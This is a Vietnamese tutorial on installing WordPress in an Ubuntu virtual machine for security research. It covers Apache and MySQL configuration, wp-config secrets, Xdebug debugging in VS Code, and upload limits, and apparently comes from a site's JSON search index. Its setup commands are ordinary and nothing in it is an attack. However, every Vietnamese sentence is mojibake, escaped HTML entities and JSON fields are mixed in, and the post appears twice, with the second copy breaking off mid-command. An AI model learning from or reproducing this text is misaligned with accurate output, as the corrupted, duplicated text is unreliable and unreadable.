ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON 